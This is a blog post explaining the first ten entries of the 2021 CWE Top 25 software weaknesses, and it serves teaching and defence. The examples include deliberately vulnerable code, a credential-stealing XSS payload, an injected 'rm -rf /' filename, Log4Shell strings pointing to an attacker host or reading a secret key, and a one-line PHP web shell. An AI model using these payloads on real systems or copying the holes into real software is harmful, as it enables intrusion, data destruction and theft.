---
title: 'A refresher on software vulnerabilities'
description: 'Reviewing the 2021 CWE Top 25 Most Dangerous Software Weaknesses'
date: 2021-12-29T08:00:00Z
draft: false
thumbnail: 'https://res.cloudinary.com/cwilliams/image/upload/c_scale,w_300/v1640782118/Blog/vulnerabilities.jpg'
images:
  [
    'https://res.cloudinary.com/cwilliams/image/upload/v1640782118/Blog/vulnerabilities.jpg',
  ]
---

I recently came across the [2021 CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/data/definitions/1337.html) list (which is something like the Grammys of security vulnerabilities) and it was a helpful refresher on how to identify and avoid common software risks.

The list highlights vulnerabilities at different levels of abstraction, from the operating system to the web page. And some of the weaknesses are only applicable to specific programming languages and operating systems, while others are generally relevant.

I found that many of the vulnerabilities were related to either accepting malicious user input or using insecure software. And so, neutralizing user input and using battle-tested tools and techniques helps mitigate many of the weaknesses.

Here’s a longer review of the first ten vulnerabilities from the list:

1\. **Out-of-bounds write**

When a program writes data past the end of a fixed-length buffer on the stack, it can cause data corruption or unexpected code execution. This vulnerability, also known as a stack buffer overflow, typically occurs in languages with manual memory management, like C and C++.

For example, this C program copies a string CLI argument into a buffer:

```c
#include <string.h>

void copy_string(char *input)
{
   char buf[5];
   strcpy(buf, input); // copy input into buf
}

int main(int argc, char **argv)
{
   copy_string(argv[1]);
   return 0;
}
```

If the user provides a string longer than 5 bytes, the program can overwrite local stack data such as the function’s return address. And if the program was running with special privileges, the attacker can gain privileged access to the machine.

One interesting example of this vulnerability was in the [Twilight Hack](http://wiibrew.org/wiki/Twilight_Hack#Explanation) of The Legend of Zelda: Twilight Princess, discovered in 2008. The hack worked by loading a custom save file that stored a horse’s name with a string that was longer than the game expected. And the extra characters in the name caused the game to run a file on the SD card that gave the user complete low-level control of the Nintendo Wii.

Modern languages and operating systems have different mechanisms for preventing stack buffer overflows, like [randomizing the memory layout](https://www.techtarget.com/searchsecurity/definition/address-space-layout-randomization-ASLR) and [disabling stack execution](https://en.wikipedia.org/wiki/Executable_space_protection).

2\. **Improper neutralization of input during web page generation (cross-site scripting)**

When a web application generates pages containing unchecked user-provided data, the page can be made to run malicious code on a client browser. For example, this program returns a web page that displays an email from the URL’s query parameters:

```js
const { email } = request.query;
return `<div class="header">Welcome, ${email}.</div>`;
```

But because the endpoint allows any value as the email address, an attacker can inject HTML elements and JS scripts into the page. A user who visits the URL with this query parameter:

```text
?email=%3Cdiv%3EPlease%20Login%3A%3Cform%20action%3D%22malicious-website.com%22%20method%3D%22POST%22%3E%3Cp%3EUsername%3A%20%3Cinput%20type%3D%22text%22%20name%3D%22username%22%20%2F%3E%3C%2Fp%3E%3Cp%3EPassword%3A%20%3Cinput%20type%3D%22password%22%20name%3D%22password%22%20%2F%3E%3C%2Fp%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%20%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E
```

...will see a login form from which the attacker can steal their private information.

```html
<div class="header">
  Welcome,
  <div>
    Please Login:

    <form action="malicious-website.com" method="POST">
      <p>Username: <input type="text" name="username" /></p>
      <p>Password: <input type="password" name="password" /></p>
      <input type="submit" value="Login" />
    </form>
  </div>
</div>
```

Most popular web servers and frameworks provide functionality to validate and escape user input to protect web applications from this vulnerability.

3\. **Out-of-bounds read**

This is the "read" version of the stack buffer overflow vulnerability, where failing to validate user input causes the program to read data outside its expected bounds.

4\. **Improper input validation**

We’ve already seen how allowing bad user input can cause crashes, data corruption, and unintended program execution. But unvalidated input can also take advantage of the program logic to produce undesired effects.

In the program below, a user provides a number of items to purchase.

```js
const total = price * request.body.quantity;
chargeUser(user, total);

function chargeUser(user, amount) {
  user.balance -= amount;
  user.save();
}
```

But if the quantity is negative, the user’s account gets credited instead of debited.

5\. **Improper neutralization of special elements used in an OS command (‘OS command injection’)**

Unchecked user input can also make a program execute unexpected OS commands. For example, this program returns a webpage that displays whether or not a user has uploaded a file with a given name.

```js
const { filename } = request.body;

try {
  execSync(`stat /home/${user.name}/${filename}`);
  return '<div>File exists</div>';
} catch (error) {
  if (isNoFileError(error)) {
    return '<div>File does not exist</div>';
  }
  return '<div>An error occurred</div>';
}
```

But if an attacker provides the filename as `"; rm -rf /"`, the executed command becomes `"stat /home/user-name/; rm -rf /"` and deletes the entire home directory!

The recent [log4j incident](https://medium.com/@CWE_CAPEC/neutralizing-your-inputs-a-log4shell-weakness-story-89954c8b25c9) is another good illustration of this vulnerability. Log4j, a popular Java logging library, interprets strings like `"${xyz}"` as executable expressions. An attacker could exploit the vulnerability by making the program log strings like `"${jndi:ldap://attack.example.com}"` and `"${env:SECRET_ACCESS_KEY}"`, which can fetch and run executable code from a remote source or leak sensitive information.

6\. **Improper neutralization of special elements used in an SQL command (‘SQL injection’)**

Similar to the previous weakness, unneutralized user input can also cause a program to execute unintended SQL queries.

Here’s a program that returns all the items belonging to a user which have some provided name:

```js
execute(`SELECT * FROM items WHERE owner = '${user.name}' AND name = '${itemName}'`);
```

But if a user passes `"name' OR 'a' = 'a"` as the item name, the query becomes:

```sql
SELECT * FROM items WHERE owner = 'user-name' AND itemname = 'name' OR 'a' = 'a'
```

…which evaluates to the query below, and returns every user’s items.

```sql
SELECT * FROM items
```

7\. **Use after free**

In memory-unsafe languages like C and C++, referencing memory after it has been freed can also cause crashes, unexpected behavior, or arbitrary code execution.

Consider a program that obtains a reference to a memory address and then frees the memory the reference points to (without deleting the reference). If the program allocates some other data to the old address, the stale reference—which is now a "dangling pointer"—can be used to get the new data.

Cleaning up pointers by setting them to NULL once they are freed protects programs from this vulnerability.

8\. **Improper limitation of a pathname to a restricted directory (‘path traversal’)**

When a program constructs pathnames from external user input, a malicious user can use special characters to access restricted files and directories.

For example, here’s a program that does not validate the name of a file to be uploaded:

```js
fs.writeFileSync(`uploads/${request.body.filename}`, request.file);
```

A malicious user can exploit this weakness by setting the filename as a relative path like `"../../secret-directory/"`, which can overwrite files in restricted locations.

9\. **Cross-Site Request Forgery (CSRF)**

In this vulnerability, a web application does not, or can not, verify whether a request was intentionally initiated by the user who submitted the request.

When a web application uses session authentication, for example, a user’s browser will include their session cookie in every request from the application. And if an attacker tricks the user into making an unintentional request (like by convincing them to click a link in an email message), the web server may treat the request as authentic and potentially expose sensitive user information.

CSRF tokens protect web applications and users from this kind of attacks. In a server-rendered application, the server generates a CSRF token (which should be unique, secret, and unpredictable) for each user session. And then, it adds the token as a hidden input field in the forms on the page. When the server receives a form request, it checks that the CSRF token field has the correct value.

```html
<input type="hidden" name="csrf-token" value="95Lzr2jnMFwSAeTeQCpV5YaEunXrkU99" />
```

Single-page applications, on the other hand, can use [cookie-to-header tokens](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Cookie-to-header_token). The server sets the CSRF token in a cookie on either page load or the first GET request. And on subsequent requests, the server checks that the the value of a custom CSRF header on the request matches the cookie. If the cookie in the initial request is scoped to match only the appropriate site domain, requests initiated from external sites or emails will not be able to read the cookie value to copy into the custom header.

10\. **Unrestricted upload of a file with dangerous type**

When a program fails to validate the type of an uploaded file, it can allow an attacker upload and execute code on the server.

For example, consider a PHP server that intends to store users’ profile pictures. If the server doesn't check the file type of the uploads, a malicious user can upload a PHP file to the directory.

```php
<?php
system($_GET['cmd']);
?>
```

And if the upload directory is also publicly accessible, the attacker can execute arbitrary code on the server by sending requests to the malicious file.

```text
http://example.com/uploads/malicious-file.php?cmd=ls%20-l
```
